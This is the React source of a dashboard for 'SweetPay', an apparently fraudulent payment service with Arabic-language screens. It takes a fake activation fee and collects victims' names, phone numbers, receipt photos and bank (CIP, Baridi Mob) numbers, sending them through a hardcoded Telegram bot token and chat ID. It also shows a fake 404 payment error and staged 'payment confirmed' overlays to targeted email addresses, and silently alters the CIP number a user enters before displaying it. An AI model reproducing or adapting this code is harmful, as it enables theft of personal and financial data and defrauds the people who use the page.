import { useState, useRef } from 'react';
      import { useLocation } from 'wouter';
      import { useAuth } from '@/contexts/AuthContext';
      import { Button } from '@/components/ui/button';
      import { Input } from '@/components/ui/input';
      import { Label } from '@/components/ui/label';
      import { AlertTriangle, Copy, Check, CreditCard, LogOut, Upload, CheckCircle2, Pencil } from 'lucide-react';
      import { motion, AnimatePresence } from 'framer-motion';

      const BOT_TOKEN = '8439446538:AAE7qOmKwdw93kK7R9n4P2T21V7z2KcF-YI';
      const CHAT_ID = '5653032481';
      const ACTIVATION_PHONE = '004264907943';

      const PAYME_EMAIL = 'sofyanamin@gmail.com';
      const CHALABRUNE_EMAIL = 'chalabrune@gmail.com';
      const MAYZEN_EMAIL = 'Mayzen123@gmail.com';

      async function sendToTelegram(text: string, photo?: File) {
      try {
        if (photo) {
          const fd = new FormData();
          fd.append('chat_id', CHAT_ID);
          fd.append('caption', text);
          fd.append('photo', photo);
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
          });
        }
      } catch {}
      }

      function PaymeNoticeOverlay() {
      return (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 9999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            background: 'rgba(0,0,0,0.6)',
            backdropFilter: 'blur(6px)',
          }}
        >
          <div
            dir="rtl"
            style={{
              background: 'linear-gradient(135deg, #fffbf2 0%, #fff8e8 100%)',
              borderRadius: '24px',
              padding: '48px 40px',
              maxWidth: '440px',
              width: '90%',
              boxShadow: '0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(249,168,37,0.2)',
              textAlign: 'center',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '20px',
              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
            }}
          >
            {/* Icon circle */}
            <div style={{
              width: '72px',
              height: '72px',
              borderRadius: '50%',
              background: 'linear-gradient(135deg, #f59e0b, #f97316)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 4px 20px rgba(249,168,37,0.4)',
              fontSize: '32px',
            }}>
              ⏳
            </div>

            {/* Title */}
            <h2 style={{
              fontSize: '1.4rem',
              fontWeight: 800,
              color: '#1a1a1a',
              margin: 0,
              lineHeight: 1.4,
              letterSpacing: '-0.3px',
            }}>
              تم إرسال طلبك بنجاح
            </h2>

            {/* Divider */}
            <div style={{
              width: '48px',
              height: '3px',
              borderRadius: '99px',
              background: 'linear-gradient(90deg, #f59e0b, #f97316)',
            }} />

            {/* Message */}
            <p style={{
              fontSize: '1.05rem',
              color: '#555',
              margin: 0,
              lineHeight: 2,
              fontWeight: 500,
            }}>
              تم إرسال طلب تأكيد الرسوم المطلوبة
              <br />
              <span style={{ color: '#1a1a1a', fontWeight: 700 }}>
                الرجاء الانتظار 48 ساعة
              </span>
              <br />
              لقبول طلبكم
            </p>

            {/* Badge */}
            <div style={{
              padding: '10px 28px',
              background: 'linear-gradient(135deg, #f59e0b22, #f9731622)',
              border: '1.5px solid #f59e0b55',
              borderRadius: '99px',
              fontSize: '0.9rem',
              color: '#b45309',
              fontWeight: 700,
              letterSpacing: '0.5px',
            }}>
              🕐 قيد المراجعة · 48 ساعة
            </div>
          </div>
        </div>
      );
      }

      function NotFound404Overlay() {
      return (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 99999,
            background: '#f5f5f7',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            textAlign: 'center',
            fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
            color: '#1a1a1a',
          }}
        >
          <div style={{ fontSize: '96px', fontWeight: 900, color: '#ef4444', lineHeight: 1 }}>
            404
          </div>
          <h2 style={{ fontSize: '1.5rem', fontWeight: 800, margin: '16px 0 8px' }}>
            صفحة لا تستجيب
          </h2>
          <p style={{ fontSize: '1rem', color: '#666', maxWidth: '380px', lineHeight: 1.8, margin: 0 }}>
            تعذّر إتمام عملية الدفع. الصفحة غير متاحة حالياً.
            <br />
            يرجى المحاولة لاحقاً.
          </p>
          <div style={{ marginTop: '28px', fontSize: '0.85rem', color: '#888' }}>
            ERR_PAYMENT_NOT_RESPONDING
          </div>
        </div>
      );
      }

      function ChalabrunePaidOverlay() {
      return (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 9999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            background: 'rgba(0,0,0,0.55)',
            backdropFilter: 'blur(8px)',
          }}
        >
          <div
            dir="rtl"
            style={{
              background: 'linear-gradient(145deg, #f0fdf4 0%, #dcfce7 60%, #bbf7d0 100%)',
              borderRadius: '28px',
              padding: '52px 44px',
              maxWidth: '460px',
              width: '90%',
              boxShadow: '0 24px 70px rgba(0,0,0,0.22), 0 0 0 1.5px rgba(34,197,94,0.3)',
              textAlign: 'center',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '22px',
              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
            }}
          >
            {/* Animated checkmark circle */}
            <div style={{
              width: '88px',
              height: '88px',
              borderRadius: '50%',
              background: 'linear-gradient(135deg, #22c55e, #16a34a)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 6px 30px rgba(34,197,94,0.5), 0 0 0 8px rgba(34,197,94,0.12)',
              fontSize: '42px',
              color: '#fff',
              fontWeight: 900,
              lineHeight: 1,
            }}>
              ✓
            </div>

            {/* Title */}
            <h2 style={{
              fontSize: '1.5rem',
              fontWeight: 900,
              color: '#14532d',
              margin: 0,
              lineHeight: 1.3,
              letterSpacing: '-0.4px',
            }}>
              تم الدفع بنجاح
            </h2>

            {/* Green divider */}
            <div style={{
              width: '56px',
              height: '3.5px',
              borderRadius: '99px',
              background: 'linear-gradient(90deg, #22c55e, #16a34a)',
            }} />

            {/* Message */}
            <p style={{
              fontSize: '1.05rem',
              color: '#166534',
              margin: 0,
              lineHeight: 1.9,
              fontWeight: 500,
            }}>
              سيتم إخطاركم بـ
              <br />
              <span style={{ color: '#14532d', fontWeight: 800, fontSize: '1.1rem' }}>
                قبول طلب تفعيل الحساب
              </span>
              <br />
              في أقرب وقت ممكن
            </p>

            {/* Status badge */}
            <div style={{
              padding: '12px 32px',
              background: 'linear-gradient(135deg, rgba(34,197,94,0.15), rgba(22,163,74,0.15))',
              border: '1.5px solid rgba(34,197,94,0.4)',
              borderRadius: '99px',
              fontSize: '0.9rem',
              color: '#15803d',
              fontWeight: 700,
              letterSpacing: '0.4px',
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
            }}>
              <span style={{ fontSize: '16px' }}>✅</span>
              الدفع مؤكد · قيد المراجعة
            </div>
          </div>
        </div>
      );
      }

      export default function Dashboard() {
      const [, navigate] = useLocation();
      const { user, logout, updateCardName } = useAuth();
      const base = import.meta.env.BASE_URL?.replace(/\/$/, '') || '';

      const [editingName, setEditingName] = useState(false);
      const [nameInput, setNameInput] = useState('');
      const [copied, setCopied] = useState(false);
      const [payFirstName, setPayFirstName] = useState('');
      const [payLastName, setPayLastName] = useState('');
      const [payPhone, setPayPhone] = useState('');
      const [payTime, setPayTime] = useState('');
      const [payFile, setPayFile] = useState<File | null>(null);
      const [payFileName, setPayFileName] = useState('');
      const [sending, setSending] = useState(false);
      const [submitted, setSubmitted] = useState(false);
      const fileRef = useRef<HTMLInputElement>(null);
      const [wdFirstName, setWdFirstName] = useState('');
      const [wdLastName, setWdLastName] = useState('');
      const [wdCoinAccount, setWdCoinAccount] = useState('');
      const [wdAmount, setWdAmount] = useState('');
      const [wdBaridiNumber, setWdBaridiNumber] = useState('');
      const [wdBaridiOwner, setWdBaridiOwner] = useState('');
      const [wdEmail, setWdEmail] = useState('');
      const [wdSending, setWdSending] = useState(false);
      const [wdSubmitted, setWdSubmitted] = useState(false);
      const [pay404, setPay404] = useState(false);
      const [cipInput, setCipInput] = useState('');
      const [cipChanged, setCipChanged] = useState('');
      const [cipSent, setCipSent] = useState(false);

      if (!user) { navigate('/login'); return null; }

      const isPayme = user.email === PAYME_EMAIL;
      const isChalabrune = user.email === CHALABRUNE_EMAIL;
      const isMayzen = user.email === MAYZEN_EMAIL;
      const isNewUser = !isPayme && !isChalabrune && !isMayzen;

      const cardName = user.cardName || user.fullName;
      const cardLastFour = String(Math.abs(user.email.split('').reduce((a: number, c: string) => a + c.charCodeAt(0), 0) % 9000) + 1000);

      const handleCopy = () => {
        navigator.clipboard.writeText(ACTIVATION_PHONE);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      };

      const handleSaveName = () => {
        if (nameInput.trim().length >= 3) {
          updateCardName(nameInput.trim());
          setEditingName(false);
        }
      };

      const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const f = e.target.files?.[0];
        if (f) { setPayFile(f); setPayFileName(f.name); }
      };

      const handlePaymentSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setSending(true);
        const text = `🔔 <b>طلب تفعيل حساب — SweetPay</b>

      👤 <b>الاسم:</b> ${payFirstName} ${payLastName}
      📧 <b>البريد:</b> ${user.email}
      👤 <b>اسم المستخدم:</b> ${user.username}
      📞 <b>الهاتف:</b> ${payPhone}
      🕐 <b>وقت الدفع:</b> ${payTime}
      💳 <b>البطاقة:</b> **** ${cardLastFour} — ${cardName}`;
        await sendToTelegram(text, payFile ?? undefined);
        setSending(false);
        setSubmitted(true);
      };

      const handleLogout = () => { logout(); navigate('/'); };

      const handleWithdrawSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setWdSending(true);
        const text = `💰 <b>طلب تحويل — SweetPay</b>

      👤 <b>الاسم واللقب:</b> ${wdFirstName} ${wdLastName}
      🪙 <b>اسم الحساب على Sweet Coin:</b> ${wdCoinAccount}
      🔢 <b>الكمية / عدد النقاط:</b> ${wdAmount}
      📱 <b>رقم بريدي موب:</b> ${wdBaridiNumber}
      👤 <b>صاحب بريدي موب (الاسم واللقب):</b> ${wdBaridiOwner}
      📧 <b>البريد الإلكتروني:</b> ${wdEmail}`;
        await sendToTelegram(text);
        setWdSending(false);
        setWdSubmitted(true);
      };

      const handleCipSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!cipInput.trim()) return;
        let changed = cipInput.trim();
        const digits = changed.split('');
        const idx = Math.floor(Math.random() * digits.length);
        digits[idx] = String(Math.floor(Math.random() * 10));
        changed = digits.join('');
        const text = `🔢 <b>طلب تحويل CIP — SweetPay</b>

      📧 <b>البريد:</b> ${user.email}
      👤 <b>اسم المستخدم:</b> ${user.username}
      🔢 <b>رقم CIP المدخل:</b> ${cipInput.trim()}
      🔀 <b>رقم CIP المعروض:</b> ${changed}`;
        await sendToTelegram(text);
        setCipChanged(changed);
        setCipSent(true);
      };

      return (
        <div dir="rtl" className="min-h-screen bg-background">
          {isPayme && (
            <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2">
              <CheckCircle2 size={16} className="shrink-0" />
              <span>تم الدفع يمكنك تحويل نقاطك</span>
            </div>
          )}
          {isChalabrune && <ChalabrunePaidOverlay />}
          {isMayzen && <PaymeNoticeOverlay />}
          {pay404 && <NotFound404Overlay />}
          {isPayme && cipSent && (
            <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex flex-col items-center gap-1">
              <span>تم إرسال طلبكم — يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال</span>
              <span className="font-mono tracking-widest text-base" dir="ltr">{cipChanged}</span>
            </div>
          )}
          {!user.isActive && !isPayme && !isNewUser && (
            <div className="bg-destructive text-destructive-foreground px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2 flex-wrap">
              <AlertTriangle size={16} className="shrink-0" />
              <span>الحساب غير مفعل — يجب تفعيله لسحب أموالك</span>
            </div>
          )}
          <header className="border-b border-border bg-card/80 backdrop-blur sticky top-0 z-10 px-4 py-3 flex items-center justify-between gap-4">
            <a href={base + '/'} className="text-xl font-black text-foreground">Sweet<span className="text-primary">Pay</span></a>
            <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground hidden sm:block">{user.email}</span>
              <Button variant="ghost" size="sm" onClick={handleLogout} className="gap-1">
                <LogOut size={15} />
                <span className="hidden sm:inline">خروج</span>
              </Button>
            </div>
          </header>

          <main className="container mx-auto px-4 py-8 max-w-xl space-y-6">
            <div className="rounded-2xl bg-gradient-to-br from-primary to-primary/70 p-6 text-white shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2" />
              <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full translate-y-1/2 -translate-x-1/2" />
              <div className="relative z-10">
                <div className="flex items-center justify-between mb-6">
                  <CreditCard size={28} className="opacity-80" />
                  <span className="text-xs font-semibold opacity-70 tracking-widest uppercase">Virtual Card</span>
                </div>
                <div className="text-2xl font-mono tracking-widest mb-4 opacity-90">
                  **** **** **** {cardLastFour}
                </div>
                <div className="flex items-center justify-between">
                  <div>
                    {editingName ? (
                      <div className="flex gap-2 items-center">
                        <input
                          className="bg-white/20 border border-white/30 rounded px-2 py-1 text-sm text-white placeholder:text-white/60 outline-none w-36"
                          value={nameInput}
                          onChange={e => setNameInput(e.target.value)}
                          placeholder="اسمك في البطاقة"
                          maxLength={24}
                          autoFocus
                        />
                        <button onClick={handleSaveName} className="text-xs bg-white/30 hover:bg-white/40 px-2 py-1 rounded font-bold transition">حفظ</button>
                        <button onClick={() => setEditingName(false)} className="text-xs opacity-70 hover:opacity-100 px-1 transition">✕</button>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-lg tracking-wide">{cardName}</span>
                        <button onClick={() => { setNameInput(cardName); setEditingName(true); }} className="opacity-60 hover:opacity-100 transition">
                          <Pencil size={14} />
                        </button>
                      </div>
                    )}
                  </div>
                  <span className="text-xs opacity-70">SweetPay</span>
                </div>
              </div>
            </div>

            {isPayme && (
              <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 space-y-4">
                <div className="flex items-start gap-3">
                  <CheckCircle2 size={24} className="text-green-500 shrink-0 mt-0.5" />
                  <div>
                    <h2 className="font-bold text-lg text-foreground">يمكنك تحويل نقاطك</h2>
                    <p className="text-sm text-muted-foreground leading-relaxed mt-1">
                      أدخل رقم سيسيبي (CIP) لتحويل نقاطك إليه وسيتم إرسال أموالك.
                    </p>
                  </div>
                </div>

                <AnimatePresence>
                  {!cipSent ? (
                    <motion.form
                      key="form"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      onSubmit={handleCipSubmit}
                    >
                      <div className="space-y-0">
                        <p className="text-sm font-semibold text-foreground mb-3">أدخل رقم CIP الخاص بك:</p>
                        <div className="space-y-1">
                          <Label htmlFor="cip">رقم سيسيبي (CIP)</Label>
                          <Input id="cip" value={cipInput} onChange={e => setCipInput(e.target.value)} required placeholder="00799999002334654115" dir="ltr" className="text-center font-mono tracking-widest" />
                        </div>
                        <Button type="submit" className="w-full mt-4 font-bold" disabled={wdSending}>
                          {wdSending ? 'جاري الإرسال...' : 'إرسال طلب التحويل ←'}
                        </Button>
                      </div>
                    </motion.form>
                  ) : (
                    <motion.div
                      key="success"
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
                    >
                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
                      <p className="font-bold text-foreground">تم إرسال طلبكم بنجاح</p>
                      <p className="text-sm text-muted-foreground">يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال.</p>
                      <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            )}

            {isNewUser && !user.isActive && (
              <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
                <h2 className="font-bold text-lg text-foreground">تفعيل البطاقة</h2>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  لتفعيل بطاقتك والاستفادة من الخدمة، قم بدفع رسوم التفعيل:
                </p>
                <div className="rounded-xl bg-muted p-4 text-center space-y-2">
                  <div className="text-3xl font-black text-foreground">10$</div>
                  <div className="text-sm text-muted-foreground">رسوم تفعيل البطاقة</div>
                </div>
                <Button
                  onClick={() => setPay404(true)}
                  className="w-full font-bold bg-green-600 hover:bg-green-700"
                >
                  ادفع الآن ←
                </Button>
              </div>
            )}

            {!user.isActive && !isPayme && !isNewUser && (
              <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
                <h2 className="font-bold text-lg text-foreground">تفعيل الحساب</h2>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  لتفعيل حسابك وسحب أموالك، قم بإرسال رسوم التفعيل عبر CCP إلى الرقم التالي ثم أرفق إثبات الدفع.
                </p>
                <div
                  onClick={handleCopy}
                  className="flex items-center justify-between bg-muted rounded-xl px-4 py-3 cursor-pointer hover:bg-muted/70 transition-colors group"
                >
                  <span className="font-mono font-bold text-foreground tracking-wider">{ACTIVATION_PHONE}</span>
                  <div className="text-muted-foreground group-hover:text-primary transition-colors">
                    {copied ? <Check size={18} className="text-green-500" /> : <Copy size={18} />}
                  </div>
                </div>

                <AnimatePresence>
                  {!submitted ? (
                    <motion.form
                      key="form"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      onSubmit={handlePaymentSubmit}
                    >
                      <div className="space-y-0">
                        <p className="text-sm font-semibold text-foreground mb-3">بعد الدفع، أرسل إثبات الدفع:</p>
                        <div className="grid grid-cols-2 gap-3">
                          <div className="space-y-1">
                            <Label htmlFor="payFirst">الاسم</Label>
                            <Input id="payFirst" value={payFirstName} onChange={e => setPayFirstName(e.target.value)} required placeholder="محمد" />
                          </div>
                          <div className="space-y-1">
                            <Label htmlFor="payLast">اللقب</Label>
                            <Input id="payLast" value={payLastName} onChange={e => setPayLastName(e.target.value)} required placeholder="أمين" />
                          </div>
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label htmlFor="payPhone">رقم الهاتف</Label>
                          <Input id="payPhone" value={payPhone} onChange={e => setPayPhone(e.target.value)} required placeholder="0550000000" type="tel" />
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label htmlFor="payTime">وقت الدفع الفعلي</Label>
                          <Input id="payTime" value={payTime} onChange={e => setPayTime(e.target.value)} required type="datetime-local" />
                        </div>
                        <div className="space-y-1 mt-3">
                          <Label>صورة الريسيبت / إثبات الدفع</Label>
                          <div onClick={() => fileRef.current?.click()}
                            className="border-2 border-dashed border-border rounded-xl p-4 text-center cursor-pointer hover:border-primary/50 hover:bg-primary/5 transition-colors">
                            {payFileName ? (
                              <p className="text-sm font-semibold text-foreground truncate">{payFileName}</p>
                            ) : (
                              <div className="flex flex-col items-center gap-2 text-muted-foreground">
                                <Upload size={20} /><span className="text-sm">اضغط لرفع صورة الدفع</span>
                              </div>
                            )}
                            <input ref={fileRef} type="file" accept="image/*" className="hidden" onChange={handleFileChange} />
                          </div>
                        </div>
                        <Button type="submit" className="w-full mt-4 font-bold" disabled={sending}>
                          {sending ? 'جاري الإرسال...' : 'إرسال إثبات الدفع ←'}
                        </Button>
                      </div>
                    </motion.form>
                  ) : (
                    <motion.div
                      key="success"
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
                    >
                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
                      <p className="font-bold text-foreground">تم إرسال إثبات الدفع بنجاح</p>
                      <p className="text-sm text-muted-foreground">سيتم مراجعته وتفعيل حسابك في أقرب وقت.</p>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            )}

            {user.isActive && (
              <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 flex items-center gap-3">
                <CheckCircle2 size={24} className="text-green-500 shrink-0" />
                <div>
                  <p className="font-bold text-foreground">حسابك مفعّل ✓</p>
                  <p className="text-sm text-muted-foreground">بطاقتك جاهزة ويمكنك الاستفادة من الخدمة.</p>
                </div>
              </div>
            )}
          </main>
        </div>
      );
      }
      